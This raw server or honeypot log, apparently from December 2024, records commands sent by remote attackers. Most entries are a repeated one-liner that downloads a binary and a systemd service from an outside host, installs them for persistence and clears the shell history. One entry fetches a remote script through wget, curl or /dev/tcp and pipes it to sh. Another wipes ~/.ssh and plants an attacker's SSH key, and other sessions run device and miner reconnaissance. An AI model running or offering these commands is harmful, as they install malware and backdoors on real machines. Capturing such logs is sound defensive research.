start

2024-12-09 09:11:14.325905 - ('195.178.110.6', 57186) - apt
2024-12-09 09:11:16.540328 - ('195.178.110.6', 57186) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 09:11:26.469898 - ('195.178.110.6', 46214) - apt
2024-12-09 09:11:29.343299 - ('195.178.110.6', 46214) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 09:11:39.831118 - ('195.178.110.6', 43116) - apt
2024-12-09 09:11:41.434036 - ('195.178.110.6', 43116) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 09:11:51.444946 - ('195.178.110.6', 44444) - apt
2024-12-09 09:11:52.947034 - ('195.178.110.6', 44444) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 09:12:03.201334 - ('195.178.110.6', 42220) - apt
2024-12-09 09:12:06.004961 - ('195.178.110.6', 42220) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 09:12:15.142942 - ('195.178.110.6', 40634) - apt
2024-12-09 09:12:17.409144 - ('195.178.110.6', 40634) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 09:12:26.560709 - ('195.178.110.6', 38554) - apt
2024-12-09 09:12:28.081653 - ('195.178.110.6', 38554) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 09:12:37.187595 - ('195.178.110.6', 46624) - apt
2024-12-09 09:12:38.769874 - ('195.178.110.6', 46624) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 09:12:48.760391 - ('195.178.110.6', 45868) - apt
2024-12-09 09:12:51.075275 - ('195.178.110.6', 45868) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 09:12:59.833037 - ('195.178.110.6', 58382) - apt
2024-12-09 09:13:02.067143 - ('195.178.110.6', 58382) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 09:13:11.017975 - ('195.178.110.6', 45786) - apt
2024-12-09 09:13:12.541227 - ('195.178.110.6', 45786) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 09:13:21.322191 - ('195.178.110.6', 57672) - apt
2024-12-09 09:13:22.941068 - ('195.178.110.6', 57672) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 09:13:32.320848 - ('195.178.110.6', 35006) - apt
2024-12-09 09:13:35.523495 - ('195.178.110.6', 35006) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 09:13:45.518221 - ('195.178.110.6', 43076) - apt
2024-12-09 09:13:47.323443 - ('195.178.110.6', 43076) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 09:13:56.732304 - ('195.178.110.6', 35908) - apt
2024-12-09 09:13:58.361492 - ('195.178.110.6', 35908) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 09:14:09.628668 - ('195.178.110.6', 43860) - apt
2024-12-09 09:14:13.121267 - ('195.178.110.6', 43860) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 09:14:22.050535 - ('195.178.110.6', 45166) - apt
2024-12-09 09:14:23.631602 - ('195.178.110.6', 45166) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 09:14:32.952881 - ('195.178.110.6', 53450) - apt
2024-12-09 09:14:34.763300 - ('195.178.110.6', 53450) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 09:14:43.378955 - ('195.178.110.6', 44956) - apt
2024-12-09 09:14:45.289989 - ('195.178.110.6', 44956) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 09:14:54.045992 - ('195.178.110.6', 39642) - apt
2024-12-09 09:14:56.228247 - ('195.178.110.6', 39642) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 09:15:06.347382 - ('195.178.110.6', 34216) - apt
2024-12-09 09:15:07.860807 - ('195.178.110.6', 34216) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 09:15:16.630615 - ('195.178.110.6', 40590) - apt
2024-12-09 09:15:18.877309 - ('195.178.110.6', 40590) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 09:15:29.879586 - ('195.178.110.6', 44694) - apt
2024-12-09 09:15:31.756543 - ('195.178.110.6', 44694) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 09:15:42.627416 - ('195.178.110.6', 49068) - apt
2024-12-09 09:15:43.938346 - ('195.178.110.6', 49068) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 09:39:06.139342 - ('122.41.245.117', 35278) - /ip cloud print
2024-12-09 09:39:07.271354 - ('122.41.245.117', 35278) - ifconfig
2024-12-09 09:39:08.195616 - ('122.41.245.117', 35278) - uname -a
2024-12-09 09:39:09.119334 - ('122.41.245.117', 35278) - cat /proc/cpuinfo
2024-12-09 09:39:10.043535 - ('122.41.245.117', 35278) - ps | grep '[Mm]iner'
2024-12-09 09:39:10.999065 - ('122.41.245.117', 35278) - ps -ef | grep '[Mm]iner'
2024-12-09 09:39:11.999803 - ('122.41.245.117', 35278) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-09 09:39:12.883162 - ('122.41.245.117', 35278) - echo Hi | cat -n
2024-12-09 10:20:02.315260 - ('197.5.145.150', 17600) - cd ~; chattr -ia .ssh; lockr -ia .ssh
2024-12-09 10:20:03.551155 - ('197.5.145.150', 17600) - cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
2024-12-09 11:29:15.949012 - ('124.55.57.139', 35321) - /ip cloud print
2024-12-09 11:29:17.081277 - ('124.55.57.139', 35321) - ifconfig
2024-12-09 11:29:18.005126 - ('124.55.57.139', 35321) - uname -a
2024-12-09 11:29:18.928979 - ('124.55.57.139', 35321) - cat /proc/cpuinfo
2024-12-09 11:29:19.857104 - ('124.55.57.139', 35321) - ps | grep '[Mm]iner'
2024-12-09 11:29:20.780906 - ('124.55.57.139', 35321) - ps -ef | grep '[Mm]iner'
2024-12-09 11:29:21.704832 - ('124.55.57.139', 35321) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-09 11:29:22.628785 - ('124.55.57.139', 35321) - echo Hi | cat -n
2024-12-09 12:59:51.972418 - ('124.52.194.210', 49082) - /ip cloud print
2024-12-09 12:59:53.076849 - ('124.52.194.210', 49082) - ifconfig
2024-12-09 12:59:53.975797 - ('124.52.194.210', 49082) - uname -a
2024-12-09 12:59:54.876756 - ('124.52.194.210', 49082) - cat /proc/cpuinfo
2024-12-09 12:59:55.771628 - ('124.52.194.210', 49082) - ps | grep '[Mm]iner'
2024-12-09 12:59:56.671349 - ('124.52.194.210', 49082) - ps -ef | grep '[Mm]iner'
2024-12-09 12:59:57.575868 - ('124.52.194.210', 49082) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-09 12:59:58.476316 - ('124.52.194.210', 49082) - echo Hi | cat -n
2024-12-09 13:17:15.500819 - ('61.39.204.240', 47134) - /ip cloud print
2024-12-09 13:17:17.237114 - ('61.39.204.240', 47134) - ifconfig
2024-12-09 13:17:18.629177 - ('61.39.204.240', 47134) - uname -a
2024-12-09 13:17:19.977193 - ('61.39.204.240', 47134) - cat /proc/cpuinfo
2024-12-09 13:17:21.369144 - ('61.39.204.240', 47134) - ps | grep '[Mm]iner'
2024-12-09 13:17:30.105447 - ('61.39.204.240', 47134) - ps -ef | grep '[Mm]iner'
2024-12-09 13:18:01.126569 - ('61.39.204.240', 47134) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-09 13:18:02.518682 - ('61.39.204.240', 47134) - echo Hi | cat -n
2024-12-09 13:40:09.540025 - ('119.68.157.39', 43202) - /ip cloud print
2024-12-09 13:40:10.996046 - ('119.68.157.39', 43202) - ifconfig
2024-12-09 13:40:12.183693 - ('119.68.157.39', 43202) - uname -a
2024-12-09 13:40:13.379713 - ('119.68.157.39', 43202) - cat /proc/cpuinfo
2024-12-09 13:40:14.543703 - ('119.68.157.39', 43202) - ps | grep '[Mm]iner'
2024-12-09 13:40:15.739677 - ('119.68.157.39', 43202) - ps -ef | grep '[Mm]iner'
2024-12-09 13:40:16.907527 - ('119.68.157.39', 43202) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-09 13:40:18.115539 - ('119.68.157.39', 43202) - echo Hi | cat -n
2024-12-09 14:47:13.687321 - ('115.141.207.114', 59566) - /ip cloud print
2024-12-09 14:47:14.840542 - ('115.141.207.114', 59566) - ifconfig
2024-12-09 14:47:15.792093 - ('115.141.207.114', 59566) - uname -a
2024-12-09 14:47:16.734845 - ('115.141.207.114', 59566) - cat /proc/cpuinfo
2024-12-09 14:47:17.678441 - ('115.141.207.114', 59566) - ps | grep '[Mm]iner'
2024-12-09 14:47:18.623988 - ('115.141.207.114', 59566) - ps -ef | grep '[Mm]iner'
2024-12-09 14:47:19.567510 - ('115.141.207.114', 59566) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-09 14:47:20.510961 - ('115.141.207.114', 59566) - echo Hi | cat -n
2024-12-09 22:31:20.343944 - ('115.141.172.199', 37832) - /ip cloud print
2024-12-09 22:31:21.474826 - ('115.141.172.199', 37832) - ifconfig
2024-12-09 22:31:22.398905 - ('115.141.172.199', 37832) - uname -a
2024-12-09 22:31:23.323500 - ('115.141.172.199', 37832) - cat /proc/cpuinfo
2024-12-09 22:31:24.243088 - ('115.141.172.199', 37832) - ps | grep '[Mm]iner'
2024-12-09 22:31:25.176130 - ('115.141.172.199', 37832) - ps -ef | grep '[Mm]iner'
2024-12-09 22:31:26.123585 - ('115.141.172.199', 37832) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-09 22:31:27.058709 - ('115.141.172.199', 37832) - echo Hi | cat -n
2024-12-09 23:45:04.975508 - ('195.178.110.6', 59200) - apt
2024-12-09 23:45:06.203794 - ('195.178.110.6', 59200) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 23:45:13.227490 - ('195.178.110.6', 44146) - apt
2024-12-09 23:45:14.358724 - ('195.178.110.6', 44146) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 23:45:21.383704 - ('195.178.110.6', 34186) - apt
2024-12-09 23:45:22.624730 - ('195.178.110.6', 34186) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 23:45:29.785053 - ('195.178.110.6', 34192) - apt
2024-12-09 23:45:30.954730 - ('195.178.110.6', 34192) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 23:45:38.266555 - ('195.178.110.6', 35516) - apt
2024-12-09 23:45:39.435813 - ('195.178.110.6', 35516) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 23:45:46.571010 - ('195.178.110.6', 53932) - apt
2024-12-09 23:45:47.860266 - ('195.178.110.6', 53932) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 23:45:54.889878 - ('195.178.110.6', 33450) - apt
2024-12-09 23:45:56.114572 - ('195.178.110.6', 33450) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 23:46:03.451711 - ('195.178.110.6', 52754) - apt
2024-12-09 23:46:04.674820 - ('195.178.110.6', 52754) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 23:46:12.108974 - ('195.178.110.6', 57448) - apt
2024-12-09 23:46:13.282254 - ('195.178.110.6', 57448) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 23:46:20.654543 - ('195.178.110.6', 57450) - apt
2024-12-09 23:46:21.876858 - ('195.178.110.6', 57450) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 23:46:29.306344 - ('195.178.110.6', 43630) - apt
2024-12-09 23:46:30.505505 - ('195.178.110.6', 43630) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 23:46:37.791007 - ('195.178.110.6', 36008) - apt
2024-12-09 23:46:39.085850 - ('195.178.110.6', 36008) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 23:46:46.343468 - ('195.178.110.6', 53770) - apt
2024-12-09 23:46:47.450521 - ('195.178.110.6', 53770) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 23:46:54.737256 - ('195.178.110.6', 50954) - apt
2024-12-09 23:46:55.910809 - ('195.178.110.6', 50954) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 23:47:03.479833 - ('195.178.110.6', 43282) - apt
2024-12-09 23:47:04.654689 - ('195.178.110.6', 43282) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 23:47:11.804617 - ('195.178.110.6', 38638) - apt
2024-12-09 23:47:13.102483 - ('195.178.110.6', 38638) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-09 23:47:20.526071 - ('195.178.110.6', 38648) - apt
2024-12-09 23:47:21.707775 - ('195.178.110.6', 38648) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 01:22:00.279880 - ('87.120.113.231', 60268) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-12-10 01:22:34.156024 - ('121.130.77.162', 59102) - /ip cloud print
2024-12-10 01:22:35.159356 - ('121.130.77.162', 59102) - ifconfig
2024-12-10 01:22:35.973762 - ('121.130.77.162', 59102) - uname -a
2024-12-10 01:22:36.789482 - ('121.130.77.162', 59102) - cat /proc/cpuinfo
2024-12-10 01:22:37.616966 - ('121.130.77.162', 59102) - ps | grep '[Mm]iner'
2024-12-10 01:22:38.433556 - ('121.130.77.162', 59102) - ps -ef | grep '[Mm]iner'
2024-12-10 01:22:39.248525 - ('121.130.77.162', 59102) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-10 01:22:40.065161 - ('121.130.77.162', 59102) - echo Hi | cat -n
2024-12-10 01:56:02.734764 - ('122.33.164.234', 33627) - /ip cloud print
2024-12-10 01:56:03.850429 - ('122.33.164.234', 33627) - ifconfig
2024-12-10 01:56:04.814420 - ('122.33.164.234', 33627) - uname -a
2024-12-10 01:56:05.730459 - ('122.33.164.234', 33627) - cat /proc/cpuinfo
2024-12-10 01:56:06.650384 - ('122.33.164.234', 33627) - ps | grep '[Mm]iner'
2024-12-10 01:56:07.566389 - ('122.33.164.234', 33627) - ps -ef | grep '[Mm]iner'
2024-12-10 01:56:08.482424 - ('122.33.164.234', 33627) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
